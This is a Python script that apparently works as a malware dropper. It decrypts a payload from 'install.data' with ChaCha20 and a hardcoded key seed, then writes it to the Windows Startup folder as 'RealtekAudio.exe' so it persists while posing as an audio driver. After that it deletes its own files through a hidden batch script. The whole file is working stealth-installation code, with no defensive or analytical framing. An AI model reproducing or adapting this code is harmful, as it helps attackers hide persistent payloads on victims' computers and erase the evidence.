import base64
import os
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes 

def schedule_self_removal():
    script_path = os.path.abspath("install.exe")
    bat_path = script_path + ".bat"
    
    bat_content = f"""@echo off
timeout /T 3 /NOBREAK > nul
del "{script_path}"
del "%~f0"
"""
    with open(bat_path, "w") as f:
        f.write(bat_content)
    
    subprocess.Popen(["cmd", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

def install():

    with open("install.data", "rb") as f:
        b64_data = f.read()

    data = base64.b64decode(b64_data)

    seed = b"ultra_mega_secure_seed"

    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=48,
        salt=None,
        info=b'data',
        backend=default_backend()
    )

    derivation = hkdf.derive(seed)
    key = derivation[:32]
    nonce = derivation[32:48]

    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    decryptor = cipher.decryptor()
    data = decryptor.update(data)

    username = os.path.basename(os.environ["USERPROFILE"])

    destination_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RealtekAudio.exe"

    with open(destination_path, "wb") as f:
        f.write(data)

    os.remove("install.data")
    schedule_self_removal()
    
if __name__ == "__main__":
    install()